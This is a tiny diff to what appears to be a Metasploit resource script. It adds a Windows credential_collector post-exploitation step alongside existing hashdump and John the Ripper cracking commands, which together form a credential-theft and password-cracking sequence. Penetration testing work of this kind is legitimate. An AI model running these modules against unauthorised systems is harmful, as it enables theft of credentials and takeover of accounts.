@@ -1,4 +1,6 @@
 run post/windows/gather/hashdump
+run post/windows/gather/credentials/credential_collector
+
 
 
 use auxiliary/analyze/jtr_crack_fast
